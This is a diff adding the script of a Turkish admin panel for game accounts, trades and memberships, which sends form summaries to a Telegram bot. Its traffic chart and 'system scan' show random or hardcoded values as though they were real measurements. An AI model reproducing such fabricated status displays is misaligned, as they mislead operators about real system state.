+        let rows = document.querySelectorAll('#accountsTable tbody tr');  
+        rows.forEach(row => {  
+            let text = row.innerText.toLowerCase();  
+            row.style.display = text.includes(val) ? '' : 'none';  
+        });  
+    }  
+
+    function updateChart(days) {  
+        document.getElementById('chartTitle').innerText = `SİTE TRAFİĞİ (SON ${days} GÜN)`;  
+        let bars = ['b1', 'b2', 'b3', 'b4', 'b5', 'b6', 'b7'];  
+        bars.forEach(b => {  
+            let randHeight = Math.floor(Math.random() * 110) + 40;  
+            document.getElementById(b).style.height = randHeight + 'px';  
+        });  
+    }  
+
+    function viewAccount(id, email, money) {  
+        alert(`ℹ️ HESAP DETAYLARI:\n\nID: ${id}\nE-Posta: ${email}\nOyun Bakiyesi: ${money}\nDurum: Aktif`);  
+    }  
+
+    function checkSystems() {  
+        let ping = Math.floor(Math.random() * 15) + 10;  
+        document.getElementById('pingVal').innerText = `Ping: ${ping}ms`;  
+        alert(`✅ Sistem Taraması Tamamlandı!\n\n• Veritabanı: Aktif\n• Telegram API: Bağlı\n• Sunucu Yanıt Süresi: ${ping}ms`);  
+    }  
+
+    function addAccountProcess() {  
+        let email = document.getElementById('accEmail').value;  
+        let pass = document.getElementById('accPass').value;  
+        let money = document.getElementById('accMoney').value;  
+        if(!email || !pass) { alert('Lütfen e-posta ve şifre girin!'); return; }  
+        let newId = '#' + Math.floor(10000 + Math.random() * 90000);  
+        sendTelegramMessage(`👤 *YENİ HESAP EKLENDİ!*\n\n🆔 *ID:* ${newId}\n📧 *E-Posta:* ${email}\n💰 *Bakiye:* ${money}`);  
+        closeModal('hesapEkleModal');  
+    }  
+
+    function sendFormToTelegram(type) {  
+        let message = '';  
+        if(type === 'TAKAS') {  
+            let u = document.getElementById('takasUser').value;  
+            let o = document.getElementById('offeredItem').value;  
+            let r = document.getElementById('requestedItem').value;  
+            if(!u || !o || !r) { alert('Lütfen gerekli alanları doldurun!'); return; }  
+            message = `🔄 *YENİ TAKAS TALEBİ*\n\n👤 *Kullanıcı:* ${u}\n📤 *Verilecek:* ${o}\n📥 *İstenen:* ${r}`;  
+            closeModal('takasModal');  
+        }   
+        else if(type === 'UYELIK') {  
+            let u = document.getElementById('uyelikUser').value;  
+            let p = document.getElementById('uyelikPaket').value;  
+            let s = document.getElementById('uyelikSuresi').value;  
+            if(!u || !s) { alert('Kullanıcı adı ve süre alanları zorunludur!'); return; }  
+            message = `👑 *YENİ ÜYELİK TANIMLANDI!*\n\n👤 *Kullanıcı:* ${u}\n📦 *Paket:* ${p}\n⏳ *Süre:* ${s}`;  
+            closeModal('uyelikEkleModal');  
+        }   
+        else if(type === 'İLAN') {  
+            let t = document.getElementById('ilanTitle').value;  
+            let p = document.getElementById('ilanPrice').value;  
+            if(!t || !p) { alert('Başlık ve fiyat zorunludur!'); return; }  
+            message = `🛒 *YENİ İLAN YAYINLANDI*\n\n📌 *Başlık:* ${t}\n💵 *Fiyat:* ${p} TL`;  
+            closeModal('ilanEkleModal');  
+        }   
+        else if(type === 'DUYURU') {  
+            let t = document.getElementById('duyuruTitle').value;  
+            let txt = document.getElementById('duyuruText').value;  
+            if(!t || !txt) { alert('Duyuru başlık ve metni boş olamaz!'); return; }  
+            message = `📢 *YENIE DUYURU*\n\n📌 *Başlık:* ${t}\n📝 *Mesaj:* ${txt}`;  
+            closeModal('duyuruModal');  
+        }  
+        sendTelegramMessage(message);  
+    }  
+
+    function sendTelegramMessage(text) {  
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {  
+            method: 'POST',  
+            headers: { 'Content-Type': 'application/json' },  
+            body: JSON.stringify({  
+                chat_id: TELEGRAM_CHAT_ID,  
+                text: text + `\n\n🌐 *Kaynak:* ZWI-VORTEX Üyelik Paneli`,  
+                parse_mode: 'Markdown'  
+            })  
+        })  
+        .then(res => res.json())  
+        .then(data => {  
+            if(data.ok) {  
+                alert('✅ İşlem Başarılı & Telegram Botuna Bildirim Gönderildi!');  
+            } else {  
+                alert('❌ Telegram Hatası: ' + (data.description || 'Bilinmeyen hata'));  
+            }  
+        })  
+        .catch(err => {  
+            alert('❌ Bağlantı hatası oluştu!');  
+        });  
+    }  
+
+    setInterval(() => {  
+        const now = new Date();  
+        if(document.getElementById('clock')) {
+            document.getElementById('clock').innerText = now.toLocaleString('tr-TR');  
+        }
+    }, 1000);  
+</script>
+
+</body>  
+</html>  
